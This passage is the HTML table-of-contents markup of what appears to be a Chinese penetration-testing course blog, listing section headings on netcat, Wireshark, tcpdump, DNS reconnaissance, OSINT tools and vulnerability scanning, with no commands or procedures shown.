href="#%E5%AE%89%E8%A3%85%E8%99%9A%E6%8B%9F%E6%9C%BA-1"><span class="toc-number">7.0.0.3.</span> <span class="toc-text">安装虚拟机</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A8%A1%E6%8B%9F%E7%9C%9F%E5%AE%9E%E7%BD%91%E7%BB%9C"><span class="toc-number">7.0.0.4.</span> <span class="toc-text">模拟真实网络</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%83%8C%E9%9D%A0%E8%83%8C%E9%98%B2%E7%81%AB%E5%A2%99"><span class="toc-number">7.0.0.5.</span> <span class="toc-text">背靠背防火墙</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Q-amp-A-2"><span class="toc-number">8.</span> <span class="toc-text">Q &amp; A</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E7%AB%A0-%E5%9F%BA%E6%9C%AC%E2%BC%AF%E5%B7%A5%E5%85%B7"><span class="toc-number">9.</span> <span class="toc-text">第五章 基本⼯工具</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="toc-number">9.0.0.1.</span> <span class="toc-text">常用工具</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NETCAT-%E2%80%94%E2%80%94NC"><span class="toc-number">9.0.0.2.</span> <span class="toc-text">NETCAT ——NC</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E7%BD%91%E7%BB%9C%E5%B7%A5%E5%85%B7%E4%B8%AD%E7%9A%84%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80%E2%80%94%E2%80%94%E5%B0%8F%E8%BA%AB%E6%9D%90%E3%80%81%E5%A4%A7%E6%99%BA%E6%85%A7"><span class="toc-number">9.0.0.2.1.</span> <span class="toc-text">• 网络工具中的瑞士军刀——小身材、大智慧</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E4%BE%A6%E5%90%AC%E6%A8%A1%E5%BC%8F-x2F-%E4%BC%A0%E8%BE%93%E6%A8%A1%E5%BC%8F"><span class="toc-number">9.0.0.2.2.</span> <span class="toc-text">• 侦听模式 &#x2F; 传输模式</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NC%E2%80%94%E2%80%94TELNET-x2F-BANNER"><span class="toc-number">9.0.0.3.</span> <span class="toc-text">NC——TELNET &#x2F; BANNER</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NC%E2%80%94%E2%80%94-%E4%BC%A0%E8%BE%93%E6%96%87%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">9.0.0.4.</span> <span class="toc-text">NC—— 传输文本信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NC%E2%80%94%E2%80%94-%E4%BC%A0%E8%BE%93%E2%BD%82%E6%96%87%E4%BB%B6-x2F-%E7%9B%AE%E5%BD%95"><span class="toc-number">9.0.0.5.</span> <span class="toc-text">NC—— 传输⽂文件 &#x2F; 目录</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E4%BC%A0%E8%BE%93%E2%BD%82%E6%96%87%E4%BB%B6"><span class="toc-number">9.0.0.5.1.</span> <span class="toc-text">• 传输⽂文件</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NC%E2%80%94%E2%80%94-%E6%B5%81%E5%AA%92%E4%BD%93%E6%9C%8D%E5%8A%A1"><span class="toc-number">9.0.0.6.</span> <span class="toc-text">NC—— 流媒体服务</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NC%E2%80%94%E2%80%94-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">9.0.0.7.</span> <span class="toc-text">NC—— 端口扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NC%E2%80%94%E2%80%94-%E8%BF%9C%E7%A8%8B%E5%85%8B%E9%9A%86%E7%A1%AC%E7%9B%98"><span class="toc-number">9.0.0.8.</span> <span class="toc-text">NC—— 远程克隆硬盘</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NC%E2%80%94%E2%80%94-%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6"><span class="toc-number">9.0.0.9.</span> <span class="toc-text">NC—— 远程控制</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E6%AD%A3%E5%90%91%EF%BC%9A"><span class="toc-number">9.0.0.9.1.</span> <span class="toc-text">• 正向：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NC%E2%80%94%E2%80%94NCAT"><span class="toc-number">9.0.0.10.</span> <span class="toc-text">NC——NCAT</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WIRESHARK"><span class="toc-number">9.0.0.11.</span> <span class="toc-text">WIRESHARK</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E6%8A%93%E5%8C%85%E5%97%85%E6%8E%A2%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90"><span class="toc-number">9.0.0.11.1.</span> <span class="toc-text">• 抓包嗅探协议分析</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E5%AE%89%E5%85%A8%E4%B8%93%E5%AE%B6%E5%BF%85%E5%A4%87%E7%9A%84%E6%8A%80%E8%83%BD"><span class="toc-number">9.0.0.11.2.</span> <span class="toc-text">• 安全专家必备的技能</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E6%8A%93%E5%8C%85%E5%BC%95%E6%93%8E"><span class="toc-number">9.0.0.11.3.</span> <span class="toc-text">• 抓包引擎</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WIRESHARK%E2%80%94%E2%80%94-%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">9.0.0.12.</span> <span class="toc-text">WIRESHARK—— 基本使用方法</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E5%90%AF%E5%8A%A8"><span class="toc-number">9.0.0.12.1.</span> <span class="toc-text">• 启动</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E9%80%89%E6%8B%A9%E6%8A%93%E5%8C%85%E2%BA%B4%E2%BD%B9%E7%BD%91%E5%8D%A1"><span class="toc-number">9.0.0.12.2.</span> <span class="toc-text">• 选择抓包⺴⽹网卡</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E6%B7%B7%E6%9D%82%E6%A8%A1%E5%BC%8F"><span class="toc-number">9.0.0.12.3.</span> <span class="toc-text">• 混杂模式</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E5%AE%9E%E6%97%B6%E6%8A%93%E5%8C%85"><span class="toc-number">9.0.0.12.4.</span> <span class="toc-text">• 实时抓包</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E4%BF%9D%E5%AD%98%E5%92%8C%E5%88%86%E6%9E%90%E6%8D%95%E8%8E%B7%E2%BD%82%E6%96%87%E4%BB%B6"><span class="toc-number">9.0.0.12.5.</span> <span class="toc-text">• 保存和分析捕获⽂文件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E2%BE%B8%E9%A6%96%E9%80%89%E9%A1%B9"><span class="toc-number">9.0.0.12.6.</span> <span class="toc-text">• ⾸首选项</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WIRESHARK%E2%80%94%E2%80%94-%E7%AD%9B%E9%80%89%E5%99%A8"><span class="toc-number">9.0.0.13.</span> <span class="toc-text">WIRESHARK—— 筛选器</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E8%BF%87%E6%BB%A4%E6%8E%89%E5%B9%B2%E6%89%B0%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85"><span class="toc-number">9.0.0.13.1.</span> <span class="toc-text">• 过滤掉干扰的数据包</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E6%8A%93%E5%8C%85%E7%AD%9B%E9%80%89%E5%99%A8"><span class="toc-number">9.0.0.13.2.</span> <span class="toc-text">• 抓包筛选器</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E6%98%BE%E2%BD%B0%E7%A4%BA%E7%AD%9B%E9%80%89%E5%99%A8"><span class="toc-number">9.0.0.13.3.</span> <span class="toc-text">• 显⽰示筛选器</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WIRESHARK%E2%80%94%E2%80%94-%E5%B8%B8%E2%BB%85%E8%A7%81%E5%8D%8F%E8%AE%AE%E5%8C%85"><span class="toc-number">9.0.0.14.</span> <span class="toc-text">WIRESHARK—— 常⻅见协议包</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E6%95%B0%E6%8D%AE%E5%8C%85%E7%9A%84%E5%88%86%E5%B1%82%E7%BB%93%E6%9E%84"><span class="toc-number">9.0.0.14.1.</span> <span class="toc-text">• 数据包的分层结构</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WIRESHARK%E2%80%94%E2%80%94TCP"><span class="toc-number">9.0.0.15.</span> <span class="toc-text">WIRESHARK——TCP</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E6%95%B0%E6%8D%AE%E6%B5%81"><span class="toc-number">9.0.0.15.1.</span> <span class="toc-text">• 数据流</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WIRESHARK%E2%80%94%E2%80%94-%E4%BF%A1%E6%81%AF%E7%BB%9F%E8%AE%A1"><span class="toc-number">9.0.0.16.</span> <span class="toc-text">WIRESHARK—— 信息统计</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E8%8A%82%E7%82%B9%E6%95%B0"><span class="toc-number">9.0.0.16.1.</span> <span class="toc-text">• 节点数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E5%8D%8F%E8%AE%AE%E5%88%86%E5%B8%83"><span class="toc-number">9.0.0.16.2.</span> <span class="toc-text">• 协议分布</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E5%8C%85%E5%A4%A7%E5%B0%8F%E5%88%86%E5%B8%83"><span class="toc-number">9.0.0.16.3.</span> <span class="toc-text">• 包大小分布</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E4%BC%9A%E8%AF%9D%E8%BF%9E%E6%8E%A5"><span class="toc-number">9.0.0.16.4.</span> <span class="toc-text">• 会话连接</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E8%A7%A3%E7%A0%81%E6%96%B9%E5%BC%8F"><span class="toc-number">9.0.0.16.5.</span> <span class="toc-text">• 解码方式</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E4%B8%93%E5%AE%B6%E7%B3%BB%E7%BB%9F"><span class="toc-number">9.0.0.16.6.</span> <span class="toc-text">• 专家系统</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WIRESHARK%E2%80%94%E2%80%94-%E5%AE%9E%E8%B7%B5"><span class="toc-number">9.0.0.17.</span> <span class="toc-text">WIRESHARK—— 实践</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WIRESHARK%E2%80%94%E2%80%94-%E5%AE%9E%E8%B7%B5-1"><span class="toc-number">9.0.0.18.</span> <span class="toc-text">WIRESHARK—— 实践</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TCPDUMP"><span class="toc-number">9.0.0.19.</span> <span class="toc-text">TCPDUMP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TCPDUMP%E2%80%94%E2%80%94-%E6%8A%93%E5%8C%85"><span class="toc-number">9.0.0.20.</span> <span class="toc-text">TCPDUMP—— 抓包</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E6%8A%93%E5%8C%85"><span class="toc-number">9.0.0.20.1.</span> <span class="toc-text">• 抓包</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TCPDUMP%E2%80%94%E2%80%94-%E7%AD%9B%E9%80%89"><span class="toc-number">9.0.0.21.</span> <span class="toc-text">TCPDUMP—— 筛选</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TCPDUMP%E2%80%94%E2%80%94-%E2%BE%BC%E9%AB%98%E7%BA%A7%E7%AD%9B%E9%80%89"><span class="toc-number">9.0.0.22.</span> <span class="toc-text">TCPDUMP—— ⾼高级筛选</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TCPDUMP%E2%80%94%E2%80%94-%E2%BE%BC%E9%AB%98%E7%BA%A7%E7%AD%9B%E9%80%89-1"><span class="toc-number">9.0.0.23.</span> <span class="toc-text">TCPDUMP—— ⾼高级筛选</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Q-amp-A-3"><span class="toc-number">10.</span> <span class="toc-text">Q &amp; A</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E5%85%AD%E7%AB%A0-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">11.</span> <span class="toc-text">第六章 被动信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">11.0.0.1.</span> <span class="toc-text">被动信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E5%85%AC%E5%BC%80%E6%B8%A0%E9%81%93%E5%8F%AF%E8%8E%B7%E5%BE%97%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="toc-number">11.0.0.1.1.</span> <span class="toc-text">• 公开渠道可获得的信息</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E4%B8%8E%E7%9B%AE%E6%A0%87%E7%B3%BB%E7%BB%9F%E4%B8%8D%E4%BA%A7%E2%BD%A3%E7%94%9F%E7%9B%B4%E6%8E%A5%E4%BA%A4%E4%BA%92"><span class="toc-number">11.0.0.1.2.</span> <span class="toc-text">• 与目标系统不产⽣生直接交互</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E5%B0%BD%E9%87%8F%E9%81%BF%E5%85%8D%E7%95%99%E4%B8%8B%E2%BC%80%E5%88%87%E7%97%95%E8%BF%B9"><span class="toc-number">11.0.0.1.3.</span> <span class="toc-text">• 尽量避免留下⼀切痕迹</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-OSINT%EF%BC%9A"><span class="toc-number">11.0.0.1.4.</span> <span class="toc-text">• OSINT：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%86%85%E5%AE%B9"><span class="toc-number">11.0.0.2.</span> <span class="toc-text">信息收集内容</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-IP%E5%9C%B0%E5%9D%80%E6%AE%B5"><span class="toc-number">11.0.0.2.1.</span> <span class="toc-text">• IP地址段</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF"><span class="toc-number">11.0.0.2.2.</span> <span class="toc-text">• 域名信息</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E9%82%AE%E4%BB%B6%E5%9C%B0%E5%9D%80"><span class="toc-number">11.0.0.2.3.</span> <span class="toc-text">• 邮件地址</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E2%BD%82%E6%96%87%E6%A1%A3%E5%9B%BE%E7%89%87%E6%95%B0%E6%8D%AE"><span class="toc-number">11.0.0.2.4.</span> <span class="toc-text">• ⽂文档图片数据</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E5%85%AC%E5%8F%B8%E5%9C%B0%E5%9D%80"><span class="toc-number">11.0.0.2.5.</span> <span class="toc-text">• 公司地址</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E5%85%AC%E5%8F%B8%E7%BB%84%E7%BB%87%E6%9E%B6%E6%9E%84"><span class="toc-number">11.0.0.2.6.</span> <span class="toc-text">• 公司组织架构</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E8%81%94%E7%B3%BB%E7%94%B5%E8%AF%9D-x2F-%E4%BC%A0%E7%9C%9F%E5%8F%B7%E7%A0%81"><span class="toc-number">11.0.0.2.7.</span> <span class="toc-text">• 联系电话 &#x2F; 传真号码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E4%BA%BA%E5%91%98%E5%A7%93%E5%90%8D-x2F-%E8%81%8C%E5%8A%A1"><span class="toc-number">11.0.0.2.8.</span> <span class="toc-text">• 人员姓名 &#x2F; 职务</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E7%9B%AE%E6%A0%87%E7%B3%BB%E7%BB%9F%E4%BD%BF%E2%BD%A4%E7%94%A8%E7%9A%84%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84"><span class="toc-number">11.0.0.2.9.</span> <span class="toc-text">• 目标系统使⽤用的技术架构</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E5%85%AC%E5%BC%80%E7%9A%84%E5%95%86%E4%B8%9A%E4%BF%A1%E6%81%AF"><span class="toc-number">11.0.0.2.10.</span> <span class="toc-text">• 公开的商业信息</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E7%94%A8%E9%80%94"><span class="toc-number">11.0.0.3.</span> <span class="toc-text">信息用途</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E7%94%A8%E4%BF%A1%E6%81%AF%E6%8F%8F%E8%BF%B0%E7%9B%AE%E6%A0%87"><span class="toc-number">11.0.0.3.1.</span> <span class="toc-text">• 用信息描述目标</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E5%8F%91%E7%8E%B0"><span class="toc-number">11.0.0.3.2.</span> <span class="toc-text">• 发现</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E6%94%BB%E5%87%BB"><span class="toc-number">11.0.0.3.3.</span> <span class="toc-text">• 社会工程学攻击</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E7%89%A9%E7%90%86%E7%BC%BA%E5%8F%A3"><span class="toc-number">11.0.0.3.4.</span> <span class="toc-text">• 物理缺口</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E2%80%94%E2%80%94DNS"><span class="toc-number">11.0.0.4.</span> <span class="toc-text">信息收集 ——DNS</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90%E6%88%90IP%E5%9C%B0%E5%9D%80"><span class="toc-number">11.0.0.4.1.</span> <span class="toc-text">• 域名解析成IP地址</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DNS-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E2%80%94%E2%80%94-NSLOOKUP"><span class="toc-number">11.0.0.5.</span> <span class="toc-text">DNS 信息收集 —— NSLOOKUP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DNS-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E2%80%94%E2%80%94-DIG"><span class="toc-number">11.0.0.6.</span> <span class="toc-text">DNS 信息收集 —— DIG</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DNS-%E5%8C%BA%E5%9F%9F%E4%BC%A0%E8%BE%93"><span class="toc-number">11.0.0.7.</span> <span class="toc-text">DNS 区域传输</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DNS-%E5%AD%97%E5%85%B8%E7%88%86%E7%A0%B4"><span class="toc-number">11.0.0.8.</span> <span class="toc-text">DNS 字典爆破</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DNS-%E6%B3%A8%E5%86%8C%E4%BF%A1%E6%81%AF"><span class="toc-number">11.0.0.9.</span> <span class="toc-text">DNS 注册信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E"><span class="toc-number">11.0.0.10.</span> <span class="toc-text">搜索引擎</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E5%85%AC%E5%8F%B8%E6%96%B0%E9%97%BB%E5%8A%A8%E6%80%81"><span class="toc-number">11.0.0.10.1.</span> <span class="toc-text">• 公司新闻动态</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E9%87%8D%E8%A6%81%E9%9B%87%E5%91%98%E4%BF%A1%E6%81%AF"><span class="toc-number">11.0.0.10.2.</span> <span class="toc-text">• 重要雇员信息</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E6%9C%BA%E5%AF%86%E6%96%87%E6%A1%A3-x2F-%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91"><span class="toc-number">11.0.0.10.3.</span> <span class="toc-text">• 机密文档 &#x2F; 网络拓扑</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81"><span class="toc-number">11.0.0.10.4.</span> <span class="toc-text">• 用户名密码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E7%9B%AE%E6%A0%87%E7%B3%BB%E7%BB%9F%E8%BD%AF%E7%A1%AC%E4%BB%B6%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84"><span class="toc-number">11.0.0.10.5.</span> <span class="toc-text">• 目标系统软硬件技术架构</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SHODAN"><span class="toc-number">11.0.0.11.</span> <span class="toc-text">SHODAN</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E6%90%9C%E7%B4%A2%E8%81%94%E7%BD%91%E7%9A%84%E8%AE%BE%E5%A4%87"><span class="toc-number">11.0.0.11.1.</span> <span class="toc-text">• 搜索联网的设备</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GOOGLE%E6%90%9C%E7%B4%A2"><span class="toc-number">11.0.0.12.</span> <span class="toc-text">GOOGLE搜索</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GOOGLE%E6%90%9C%E7%B4%A2%E2%80%94%E2%80%94%E5%AE%9E%E4%BE%8B"><span class="toc-number">11.0.0.13.</span> <span class="toc-text">GOOGLE搜索——实例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#YA-N-D-E-X"><span class="toc-number">11.0.0.14.</span> <span class="toc-text">YA N D E X</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E4%B8%96%E7%95%8C%E7%AC%AC%E5%9B%9B%E5%A4%A7%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E2%80%94%E2%80%94%E4%BF%84%E7%BD%97%E6%96%AF"><span class="toc-number">11.0.0.14.1.</span> <span class="toc-text">• 世界第四大搜索引擎——俄罗斯</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RECON-NG"><span class="toc-number">11.0.0.15.</span> <span class="toc-text">RECON-NG</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%BD%A4%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF"><span class="toc-number">11.0.0.16.</span> <span class="toc-text">⽤用户信息</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E9%82%AE%E4%BB%B6"><span class="toc-number">11.0.0.16.1.</span> <span class="toc-text">• 邮件</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MELTAGO"><span class="toc-number">11.0.0.17.</span> <span class="toc-text">MELTAGO</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E7%94%B3%E8%AF%B7%E8%B4%A6%E5%8F%B7"><span class="toc-number">11.0.0.17.1.</span> <span class="toc-text">• 申请账号</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E7%99%BB%E9%99%86%E4%BD%BF%E7%94%A8"><span class="toc-number">11.0.0.17.2.</span> <span class="toc-text">• 登陆使用</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E9%80%94%E5%BE%84"><span class="toc-number">11.0.0.18.</span> <span class="toc-text">其他途径</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E7%A4%BE%E4%BA%A4%E7%BD%91%E7%BB%9C"><span class="toc-number">11.0.0.18.1.</span> <span class="toc-text">• 社交网络</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E2%BC%AF%E5%B7%A5%E5%95%86%E6%B3%A8%E5%86%8C"><span class="toc-number">11.0.0.18.2.</span> <span class="toc-text">• ⼯工商注册</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E6%96%B0%E9%97%BB%E7%BB%84-x2F-%E8%AE%BA%E5%9D%9B"><span class="toc-number">11.0.0.18.3.</span> <span class="toc-text">• 新闻组 &#x2F; 论坛</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E6%8B%9B%E8%81%98%E7%BD%91%E7%AB%99"><span class="toc-number">11.0.0.18.4.</span> <span class="toc-text">• 招聘网站</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%AA%E4%BA%BA%E4%B8%93%E5%B1%9E%E7%9A%84%E5%AF%86%E7%A0%81%E5%AD%97%E5%85%B8"><span class="toc-number">11.0.0.19.</span> <span class="toc-text">个人专属的密码字典</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E6%8C%89%E4%B8%AA%E2%BC%88%E4%BA%BA%E4%BF%A1%E6%81%AF%E2%BD%A3%E7%94%9F%E6%88%90%E5%85%B6%E4%B8%93%E5%B1%9E%E7%9A%84%E5%AF%86%E7%A0%81%E5%AD%97%E5%85%B8"><span class="toc-number">11.0.0.19.1.</span> <span class="toc-text">• 按个⼈人信息⽣生成其专属的密码字典</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#METADATA"><span class="toc-number">11.0.0.20.</span> <span class="toc-text">METADATA</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RECON-NG-1"><span class="toc-number">11.0.0.21.</span> <span class="toc-text">RECON-NG</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RECON-NG-2"><span class="toc-number">11.0.0.22.</span> <span class="toc-text">RECON-NG</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E5%85%A8%E5%B1%80%E9%80%89%E9%A1%B9"><span class="toc-number">11.0.0.22.1.</span> <span class="toc-text">• 全局选项</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RECON-NG-3"><span class="toc-number">11.0.0.23.</span> <span class="toc-text">RECON-NG</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-DNS%E6%9F%A5%E8%AF%A2"><span class="toc-number">11.0.0.23.1.</span> <span class="toc-text">• DNS查询</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Q-amp-A-4"><span class="toc-number">12.</span> <span class="toc-text">Q &amp; A</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%B8%83%E7%AB%A0-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">13.</span> <span class="toc-text">第七章 主动信息收集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E5%85%AB%E7%AB%A0-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F"><span class="toc-number">14.</span> <span class="toc-text">第八章 漏洞扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%91%E7%8E%B0%E5%BC%B1%E7%82%B9"><span class="toc-number">14.0.0.1.</span> <span 